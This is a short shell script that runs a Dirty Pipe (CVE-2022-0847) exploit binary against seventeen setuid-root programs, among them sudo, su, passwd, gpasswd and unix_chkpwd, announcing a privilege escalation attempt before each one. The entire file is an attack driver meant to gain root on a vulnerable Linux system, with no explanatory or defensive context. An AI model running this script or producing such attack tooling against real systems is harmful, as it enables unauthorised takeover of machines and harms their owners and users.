#!/usr/bin/env sh
echo "Privilege escalation on /bin/busybox.suid: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /bin/busybox.suid
echo "Privilege escalation on /bin/mount.util-linux: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /bin/mount.util-linux
echo "Privilege escalation on /bin/su.shadow: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /bin/su.shadow
echo "Privilege escalation on /bin/umount.util-linux: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /bin/umount.util-linux
echo "Privilege escalation on /usr/bin/chage: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/chage
echo "Privilege escalation on /usr/bin/chfn.shadow: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/chfn.shadow
echo "Privilege escalation on /usr/bin/chsh.shadow: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/chsh.shadow
echo "Privilege escalation on /usr/bin/expiry: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/expiry
echo "Privilege escalation on /usr/bin/fusermount3: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/fusermount3
echo "Privilege escalation on /usr/bin/gpasswd: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/gpasswd
echo "Privilege escalation on /usr/bin/newgidmap: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/newgidmap
echo "Privilege escalation on /usr/bin/newgrp.shadow: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/newgrp.shadow
echo "Privilege escalation on /usr/bin/newuidmap: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/newuidmap
echo "Privilege escalation on /usr/bin/passwd.shadow: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/passwd.shadow
echo "Privilege escalation on /usr/bin/sudo: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/bin/sudo
echo "Privilege escalation on /usr/libexec/dbus-daemon-launch-helper: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/libexec/dbus-daemon-launch-helper
echo "Privilege escalation on /usr/sbin/unix_chkpwd: "
./CVE-2022-0847-DirtyPipe-Exploits/exploit-2 /usr/sbin/unix_chkpwd